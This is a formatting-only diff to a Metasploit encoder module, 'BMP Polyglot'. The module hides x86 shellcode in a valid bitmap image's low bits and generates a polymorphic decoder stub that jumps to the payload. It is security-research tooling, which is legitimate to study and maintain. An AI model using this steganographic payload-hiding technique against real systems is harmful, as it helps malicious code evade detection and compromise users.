@@ -67,6 +67,7 @@ class SizeCalculator
   def initialize(size, minimum_jump)
     @original_size = size
     raise if minimum_jump < 0 || minimum_jump > 0xff
+
     @minimum_jump = minimum_jump
   end
 
@@ -77,6 +78,7 @@ class SizeCalculator
     size = new_size_short
     possibles << size unless size.nil?
     return if possibles.length == 0
+
     possibles.min
   end
 
@@ -91,7 +93,7 @@ class SizeCalculator
       byte_4 = size[i + 4].to_i
       min_jmp = (@minimum_jump - 5 - i)
 
-      if byte_2 + byte_3 + byte_4 > 0  # this jmp would be too large
+      if byte_2 + byte_3 + byte_4 > 0 # this jmp would be too large
         if byte_0 > 0xfd
           size = increment_size(size, i)
         end
@@ -114,7 +116,8 @@ class SizeCalculator
   end
 
   def new_size_short
-    return if @minimum_jump > 0x81  # short won't make it in this case (0x7f + 0.upto(2).to_a.max)
+    return if @minimum_jump > 0x81 # short won't make it in this case (0x7f + 0.upto(2).to_a.max)
+
     size = [ @original_size ].pack('V').unpack('CCCC')
 
     0.upto(2) do |i|
@@ -151,7 +154,7 @@ class SizeCalculator
     end
 
     if packed[0] == "\xe9"
-      jmp +=  packed[1..4].unpack('V')[0]
+      jmp += packed[1..4].unpack('V')[0]
       jmp += 5
     elsif packed[0] == "\xeb"
       jmp += packed[1].unpack('C')[0]
@@ -184,8 +187,8 @@ class MetasploitModule < Msf::Encoder
 
   def initialize
     super(
-      'Name'             => 'BMP Polyglot',
-      'Description'      => %q{
+      'Name' => 'BMP Polyglot',
+      'Description' => %q{
         Encodes a payload in such a way that the resulting binary blob is both
         valid x86 shellcode and a valid bitmap image file (.bmp). The selected
         bitmap file to inject into must use the BM (Windows 3.1x/95/NT) header
@@ -194,20 +197,20 @@ class MetasploitModule < Msf::Encoder
         compression. This encoder makes absolutely no effort to remove any
         invalid characters.
       },
-      'Author'           => 'Spencer McIntyre',
-      'Arch'             => ARCH_X86,
-      'License'          => MSF_LICENSE,
-      'References'       =>
-        [
-          [ 'URL'        => 'https://warroom.securestate.com/bmp-x86-polyglot/' ]
-        ]
+      'Author' => 'Spencer McIntyre',
+      'Arch' => ARCH_X86,
+      'License' => MSF_LICENSE,
+      'References' => [
+        [ 'URL' => 'https://warroom.securestate.com/bmp-x86-polyglot/' ]
+      ]
     )
 
     register_options(
       [
         OptString.new('BitmapFile', [ true, 'The .bmp file to inject into' ])
       ],
-      self.class)
+      self.class
+    )
   end
 
   def can_preserve_registers?
@@ -236,7 +239,7 @@ class MetasploitModule < Msf::Encoder
   #   - large enough to store all of the image data and the assembly stub
   #   - is also a valid x86 jmp instruction to land on the assembly stub
   def calc_new_size(orig_size, stub_length)
-    minimum_jump = BM_HEADER_SIZE + DIB_HEADER_SIZE - 2  # -2 for the offset of the size in the BM header
+    minimum_jump = BM_HEADER_SIZE + DIB_HEADER_SIZE - 2 # -2 for the offset of the size in the BM header
     calc = SizeCalculator.new(orig_size + stub_length, minimum_jump)
     size = calc.calculate.to_i
     raise EncodingError, 'Bad .bmp, failed to calculate jmp for size' if size < orig_size
@@ -253,6 +256,7 @@ class MetasploitModule < Msf::Encoder
     return 1 if sc_len * 8 <= data_len
     return 2 if sc_len * 4 <= data_len
     return 4 if sc_len * 2 <= data_len
+
     raise EncodingError, 'Bad .bmp, not enough image data for stego operation'
   end
 
@@ -260,6 +264,7 @@ class MetasploitModule < Msf::Encoder
   # the binary data which directly follows it
   def make_destego_stub(shellcode_size, padding, lsbs = 1)
     raise RuntimeError, 'Invalid number of storage bits' unless [1, 2, 4].include?(lsbs)
+
     gen_regs = [ 'eax', 'ebx', 'ecx', 'edx' ].shuffle
     ptr_regs = [ 'edi', 'esi' ].shuffle
     # declare logical registers
@@ -283,49 +288,41 @@ class MetasploitModule < Msf::Encoder
     set_byte_ctr = Proc.new { |b| (0xb8 + b.regnum_of(ctr_reg)).chr + [ shellcode_size ].pack('V') }
     adjust_src_addr = Proc.new { |b| "\x81" + (0xc0 + b.regnum_of(src_addr_reg)).chr + [ padding ].pack('V') }
     initialize = Rex::Poly::LogicalBlock.new('initialize',
-      Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) + set_byte_ctr.call(b) },
-      Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + set_byte_ctr.call(b) + adjust_src_addr.call(b) },
-      Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_byte_ctr.call(b) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
-      Proc.new { |b| "\x60" + get_eip.call(b) + set_byte_ctr.call(b) + set_src_addr.call(b,  -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
-      Proc.new { |b| "\x60" + set_byte_ctr.call(b) + get_eip.call(b) + set_src_addr.call(b, -11) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
-    )
+                                             Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) + set_byte_ctr.call(b) },
+                                             Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + set_byte_ctr.call(b) + adjust_src_addr.call(b) },
+                                             Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_byte_ctr.call(b) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
+                                             Proc.new { |b| "\x60" + get_eip.call(b) + set_byte_ctr.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
+                                             Proc.new { |b| "\x60" + set_byte_ctr.call(b) + get_eip.call(b) + set_src_addr.call(b, -11) + set_dst_addr.call(b) + adjust_src_addr.call(b) },)
 
     clr_byte_reg = Proc.new { |b| [0x29, 0x2b, 0x31, 0x33].sample.chr + (0xc0 + (b.regnum_of(byte_reg) << 3) + b.regnum_of(byte_reg)).chr }
     clr_ctr = Proc.new { |b| [0x29, 0x2b, 0x31, 0x33].sample.chr + (0xc0 + (b.regnum_of(ctr_reg) << 3) + b.regnum_of(ctr_reg)).chr }
     backup_byte_ctr = Proc.new { |b| (0x50 + b.regnum_of(ctr_reg)).chr }
     set_bit_ctr = Proc.new { |b| (0xb0 + b.regnum_of(ctr_reg)).chr + (8 / lsbs).chr }
     get_byte_loop = Rex::Poly::LogicalBlock.new('get_byte_loop',
-      Proc.new { |b| clr_byte_reg.call(b) + backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },
-      Proc.new { |b| backup_byte_ctr.call(b) + clr_byte_reg.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },
-      Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + clr_byte_reg.call(b) + set_bit_ctr.call(b) },
-      Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) + clr_byte_reg.call(b) },
-    )
+                                                Proc.new { |b| clr_byte_reg.call(b) + backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },
+                                                Proc.new { |b| backup_byte_ctr.call(b) + clr_byte_reg.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },
+                                                Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + clr_byte_reg.call(b) + set_bit_ctr.call(b) },
+                                                Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) + clr_byte_reg.call(b) },)
     get_byte_loop.depends_on(initialize)
 
     shift_byte_reg = Rex::Poly::LogicalBlock.new('shift_byte_reg',
-      Proc.new { |b| "\xc1" + (0xe0 + b.regnum_of(byte_reg)).chr + lsbs.chr }
-    )
+                                                 Proc.new { |b| "\xc1" + (0xe0 + b.regnum_of(byte_reg)).chr + lsbs.chr })
     read_byte = Rex::Poly::LogicalBlock.new('read_byte',
-      Proc.new { |b| "\x8a" + ((b.regnum_of(bit_reg) << 3) + b.regnum_of(src_addr_reg)).chr }
-    )
+                                            Proc.new { |b| "\x8a" + ((b.regnum_of(bit_reg) << 3) + b.regnum_of(src_addr_reg)).chr })
     inc_src_reg = Rex::Poly::LogicalBlock.new('inc_src_reg',
-      Proc.new { |b| (0x40 + b.regnum_of(src_addr_reg)).chr }
-    )
+                                              Proc.new { |b| (0x40 + b.regnum_of(src_addr_reg)).chr })
     inc_src_reg.depends_on(read_byte)
     get_lsb = Rex::Poly::LogicalBlock.new('get_lsb',
-      Proc.new { |b| "\x80" + (0xe0 + b.regnum_of(bit_reg)).chr + (0xff >> (8 - lsbs)).chr }
-    )
+                                          Proc.new { |b| "\x80" + (0xe0 + b.regnum_of(bit_reg)).chr + (0xff >> (8 - lsbs)).chr })
     get_lsb.depends_on(read_byte)
     put_lsb = Rex::Poly::LogicalBlock.new('put_lsb',
-      Proc.new { |b| "\x08"+ (0xc0 + (b.regnum_of(bit_reg) << 3) + b.regnum_of(byte_reg)).chr }
-    )
+                                          Proc.new { |b| "\x08" + (0xc0 + (b.regnum_of(bit_reg) << 3) + b.regnum_of(byte_reg)).chr })
     put_lsb.depends_on(get_lsb, shift_byte_reg)
     jmp_bit_loop_body = Rex::Poly::LogicalBlock.new('jmp_bit_loop_body')
     jmp_bit_loop_body.depends_on(put_lsb, inc_src_reg)
 
     jmp_bit_loop = Rex::Poly::LogicalBlock.new('jmp_bit_loop',
-      Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + "\x75" + (0xfe + -12).chr }
-    )
+                                               Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + "\x75" + (0xfe + -12).chr })
     jmp_bit_loop.depends_on(jmp_bit_loop_body)
 
     get_bit_loop = Rex::Poly::LogicalBlock.new('get_bit_loop_body', jmp_bit_loop.generate([ Rex::Arch::X86::EBP, Rex::Arch::X86::ESP ]))
@@ -335,15 +332,13 @@ class MetasploitModule < Msf::Encoder
     inc_dst_reg = Proc.new { |b| (0x40 + b.regnum_of(dst_addr_reg)).chr }
     restore_byte_ctr = Proc.new { |b| (0x58 + b.regnum_of(ctr_reg)).chr }
     get_byte_post = Rex::Poly::LogicalBlock.new('get_byte_post',
-      Proc.new { |b| put_byte.call(b) + inc_dst_reg.call(b) + restore_byte_ctr.call(b) },
-      Proc.new { |b| put_byte.call(b) + restore_byte_ctr.call(b) + inc_dst_reg.call(b) },
-      Proc.new { |b| restore_byte_ctr.call(b) + put_byte.call(b) + inc_dst_reg.call(b) },
-    )
+                                                Proc.new { |b| put_byte.call(b) + inc_dst_reg.call(b) + restore_byte_ctr.call(b) },
+                                                Proc.new { |b| put_byte.call(b) + restore_byte_ctr.call(b) + inc_dst_reg.call(b) },
+                                                Proc.new { |b| restore_byte_ctr.call(b) + put_byte.call(b) + inc_dst_reg.call(b) },)
     get_byte_post.depends_on(get_bit_loop)
 
     jmp_byte_loop_body = Rex::Poly::LogicalBlock.new('jmp_byte_loop_body',
-      Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + "\x75" + (0xfe + -26).chr  }
-    )
+                                                     Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + "\x75" + (0xfe + -26).chr })
     jmp_byte_loop_body.depends_on(get_byte_post)
 
     finalize = Rex::Poly::LogicalBlock.new('finalize', "\x61")
@@ -390,6 +385,7 @@ class MetasploitModule < Msf::Encoder
 
     header, original_size, _, _, original_offset = header.unpack('vVvvV')
     raise EncodingError, 'Bad .bmp header, must be 0x424D (BM)' if header != 0x4d42
+
     validate_dib_header(dib_header)
 
     lsbs = calc_required_lsbs(buf.length, image_data.length)
